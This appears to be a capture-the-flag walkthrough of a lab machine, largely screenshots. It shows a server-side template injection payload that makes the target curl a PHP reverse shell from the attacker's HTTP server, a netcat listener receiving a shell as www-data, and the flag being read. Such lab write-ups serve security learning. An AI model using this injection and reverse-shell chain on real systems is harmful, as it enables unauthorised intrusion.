<img width="963" height="282" alt="Screenshot 2026-09-05 205723" src="https://github.com/user-attachments/assets/4daa4f45-57c1-439d-a109-d7190c2a4a31" />

<img width="762" height="327" alt="Screenshot 2026-09-06 093917" src="https://github.com/user-attachments/assets/bafe9f1a-f112-4721-a073-81e7d775dd12" />

<img width="766" height="272" alt="Screenshot 2026-09-06 093929" src="https://github.com/user-attachments/assets/9a5cb3b5-a0d4-44ec-8cb5-b11976011a34" />

<img width="760" height="420" alt="Screenshot 2026-09-06 093841" src="https://github.com/user-attachments/assets/b8ef4239-fbe1-49c1-8a69-20e08e942be9" />

<img width="755" height="407" alt="Screenshot 2026-09-06 093856" src="https://github.com/user-attachments/assets/1facad37-7922-41e3-9b6e-a04501649635" />

<img width="752" height="417" alt="Screenshot 2026-09-06 100534" src="https://github.com/user-attachments/assets/056cf250-32a2-4903-8795-19e901e44065" />

<img width="761" height="422" alt="Screenshot 2026-09-06 100550" src="https://github.com/user-attachments/assets/85464100-dde8-479c-82b0-aaa6556a9ee4" />

<img width="698" height="727" alt="Screenshot 2026-09-06 100347" src="https://github.com/user-attachments/assets/e1553e65-f103-48c3-ab80-6bbd74b101d5" />

```
┌──(kali㉿kali)-[~]
└─$ sudo nano php-reverser.php
```

<img width="927" height="695" alt="Screenshot 2026-09-06 100506" src="https://github.com/user-attachments/assets/37917fdf-edb1-4f0e-ac27-d4f42fb639e4" />

```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

`{system('curl http://192.168.128.176:8000/php-reverser.php -o /tmp/payload.php')}`

<img width="758" height="411" alt="Screenshot 2026-09-06 100929" src="https://github.com/user-attachments/assets/c9acbe3d-dc25-40d9-b817-a7957a150025" />

```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.113.163.157 - - [05/Sep/2026 23:09:12] "GET /php-reverser.php HTTP/1.1" 200 -
```

<img width="771" height="422" alt="Screenshot 2026-09-06 101501" src="https://github.com/user-attachments/assets/bc1b6a44-bea1-4fb2-be93-5a2ba0221dcd" />

```
┌──(kali㉿kali)-[~]
└─$ nc -vnlp 1234
listening on [any] 1234 ...
connect to [192.168.128.176] from (UNKNOWN) [10.113.163.157] 54908
Linux 3378a1f16343 5.15.0-1050-aws #55~20.04.1-Ubuntu SMP Mon Nov 6 12:15:34 UTC 2023 x86_64 GNU/Linux
 03:16:27 up 47 min,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ pwd
/
```
```
$ cd /var/www/html
```
```
$ ls
105e15924c1e41bf53ea64afa0fa72b2.txt
LICENSE.txt
admin
cache
clients
error.php
forget_password.php
global
index.php
install
modules
process.php
react
themes
upload
vendor
```

```
$ cat 105e15924c1e41bf53ea64afa0fa72b2.txt
THM{w0rK1Ng_sST1}
```
